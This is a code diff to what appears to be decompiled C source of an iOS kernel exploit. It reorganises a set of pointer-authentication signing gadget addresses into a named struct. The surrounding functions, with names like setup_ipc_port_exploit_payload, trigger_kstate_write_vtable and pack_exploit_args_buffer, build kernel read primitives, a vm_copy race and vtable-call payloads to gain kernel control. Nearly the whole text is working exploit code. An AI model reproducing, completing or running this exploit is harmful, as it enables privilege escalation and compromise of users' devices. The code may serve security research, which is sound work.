@@ -1759,6 +1759,19 @@ struct mach_voucher_u64_recipe
   uint64_t content;
 };
 
+struct iokit_notify_dispatch_gadgets
+{
+  uint64_t notificationSelector;
+  uint64_t taskPortIpcKobjectOffset;
+  uint64_t pacgaCluster;
+  uint64_t pacgaX5StoreRet;
+  uint64_t paciaStoreRet;
+  uint64_t pacdaStoreRet;
+  uint64_t threadStateHelper;
+  uint64_t pageInfoHelper;
+  uint64_t pacgaStoreRet;
+};
+
 static const integer_t kVmcopyRaceLowPriorityPolicy[4] = { 0x20A51, 0x2710, 0x2711, 1 };
 static const integer_t kVmcopyRaceHighPriorityPolicy[4] = { 0x3E8, 0xF4240, 0xF4241, 1 };
 static const uint64_t kVmcopyFakePageMarkers[2] = { 0x43434343, 0x44444444 };
@@ -1780,6 +1793,17 @@ static const uint32_t kIOSurfaceIdToTaskVmInfoIndex[27] = {
 };
 static const uint32_t kLegacyIokitSlotTypes[10] = { 17, 4, 3, 6, 7, 5, 40, 20, 2, 42 };
 static const uint32_t kHashDigestSizes[4] = { 20, 32, 20, 48 };
+static struct iokit_notify_dispatch_gadgets gIokitNotifyDispatchGadgets;
+
+#define qword_48000 gIokitNotifyDispatchGadgets.notificationSelector
+#define qword_48008 gIokitNotifyDispatchGadgets.taskPortIpcKobjectOffset
+#define qword_48010 gIokitNotifyDispatchGadgets.pacgaCluster
+#define qword_48018 gIokitNotifyDispatchGadgets.pacgaX5StoreRet
+#define qword_48020 gIokitNotifyDispatchGadgets.paciaStoreRet
+#define qword_48028 gIokitNotifyDispatchGadgets.pacdaStoreRet
+#define qword_48030 gIokitNotifyDispatchGadgets.threadStateHelper
+#define qword_48038 gIokitNotifyDispatchGadgets.pageInfoHelper
+#define qword_48040 gIokitNotifyDispatchGadgets.pacgaStoreRet
 
 #define SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(dst) \
   do { \
@@ -1959,15 +1983,6 @@ __int64 (__fastcall *off_448E0[7])() =
 }; // weak
 _UNKNOWN unk_44918; // weak
 _UNKNOWN unk_44938; // weak
-__int64 qword_48000; // weak
-__int64 qword_48008; // weak
-__int64 qword_48010; // weak
-__int64 qword_48018; // weak
-__int64 qword_48020; // weak
-__int64 qword_48028; // weak
-__int64 qword_48030; // weak
-__int64 qword_48038; // weak
-__int64 qword_48040; // weak
 __int16 word_48048; // weak
 __int16 word_4804A; // weak
 __int16 word_4804C; // weak
@@ -5922,7 +5937,6 @@ LABEL_27:
 // BA54: variable 'v17' is possibly undefined
 // BA88: variable 'v23' is possibly undefined
 // 448E0: using guessed type __int64 (__fastcall *off_448E0[7])();
-// 48000: using guessed type __int64 qword_48000;
 // 48048: using guessed type __int16 word_48048;
 // 480D8: using guessed type __int64 qword_480D8;
 
@@ -10437,7 +10451,6 @@ __int64 __fastcall setup_ipc_port_exploit_payload(__int64 a1, __int64 a2, int a3
   v14 = *(uint64_t *)(a1 + 664) + 61440LL;
   return kread_u64_value(v13, v14);
 }
-// 48038: using guessed type __int64 qword_48038;
 
 //----- (0000000000010DEC) ----------------------------------------------------
 __int64 __fastcall send_iokit_notification(__int64 a1, __int64 a2, uint64_t *a3)
@@ -10466,7 +10479,6 @@ __int64 __fastcall prepare_iokit_notification_payload(__int64 a1, __int64 a2, __
   v5 = *(uint64_t *)(a1 + 664) + 61440LL;
   return kread_u64_value(v4, v5);
 }
-// 48020: using guessed type __int64 qword_48020;
 
 //----- (0000000000010F6C) ----------------------------------------------------
 __int64 __fastcall vtable_call_slot2(__int64 a1, __int64 a2)
@@ -10490,7 +10502,6 @@ __int64 __fastcall setup_notification_extra_args(__int64 a1, __int64 a2, __int64
   v5 = *(uint64_t *)(a1 + 664) + 61696LL;
   return kread_u64_value(v4, v5);
 }
-// 48028: using guessed type __int64 qword_48028;
 
 //----- (0000000000011054) ----------------------------------------------------
 __int64 __fastcall trigger_kstate_write_vtable(__int64 *a1, __int64 a2, __int64 a3)
@@ -10503,7 +10514,6 @@ __int64 __fastcall trigger_kstate_write_vtable(__int64 *a1, __int64 a2, __int64 
   (*(void (__fastcall **)(__int64 *, __int64, __int64, uint64_t *))(*a1 + 8))(a1, qword_48018, 6, payload);
   return kread_u64_value(a1[1], a1[83] + 61696);
 }
-// 48018: using guessed type __int64 qword_48018;
 
 //----- (00000000000110FC) ----------------------------------------------------
 __int64 __fastcall pack_exploit_args_buffer(
@@ -10531,7 +10541,6 @@ __int64 __fastcall pack_exploit_args_buffer(
            16,
            payload);
 }
-// 48000: using guessed type __int64 qword_48000;
 
 //----- (00000000000111B4) ----------------------------------------------------
 __int64 __fastcall call_vtable_ptr_slot2(__int64 a1)
@@ -11183,10 +11192,6 @@ LABEL_68:
   while ( v54 == 87 );
   return 0;
 }
-// 48008: using guessed type __int64 qword_48008;
-// 48010: using guessed type __int64 qword_48010;
-// 48030: using guessed type __int64 qword_48030;
-// 48040: using guessed type __int64 qword_48040;
 
 struct vmcopy_race_thread_block_ref
 {
